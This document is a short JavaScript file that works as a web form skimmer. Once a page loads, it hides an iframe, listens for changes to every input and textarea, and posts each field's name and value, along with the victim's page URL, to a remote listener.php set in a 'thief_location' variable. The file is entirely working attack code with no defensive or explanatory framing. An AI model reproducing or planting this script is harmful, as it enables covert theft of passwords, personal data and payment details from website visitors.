var thief_location = ""; //location of listener.php

document.addEventListener("DOMContentLoaded", function() {
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("id", "thiefmailbox");
	ifrm.setAttribute("name", "thiefmailbox");
	ifrm.style.display = "none";
	document.body.appendChild(ifrm);
	
	var inputs = document.querySelectorAll('input');
	for(var i = 0; i < inputs.length; i++) {
		inputs[i].addEventListener("change", function(e) {stealInput(e.currentTarget)});
	}
	var textareas = document.getElementsByTagName('textarea');
	for(var i = 0; i < textareas.length; i++) {
		textareas[i].addEventListener("change", function(e) {stealInput(e.currentTarget)});
	}
	stealLocation();
}, false);

	
function stealLocation(){
	var loc = {};
	loc['victim_location'] = location.href;
	sendMail(loc, "location");
}
function stealInput(inputInfo){
	var name = inputInfo.name;
	var value = inputInfo.value;
	var stolenInput = {};
	if(name === ""){
		name="undefined_input";
	}
	if(value != ""){
		stolenInput[name] = value;
		sendMail(stolenInput, "input");
	}
}
function sendMail(params, type){
	var form = document.createElement("form");
	form.setAttribute("method", "post");
	if(type=="location"){
		form.setAttribute("action", thief_location+"?lo");
	}
	else{
		form.setAttribute("action", thief_location);
	}
	form.setAttribute("target", "thiefmailbox");
	for(var key in params) {
		if(params.hasOwnProperty(key)) {
			var field = document.createElement("input");
			field.setAttribute("type", "hidden");
			field.setAttribute("name", key);
			field.setAttribute("value", params[key]);
			form.appendChild(field);
		}
	}
	document.body.appendChild(form);
	form.submit();
}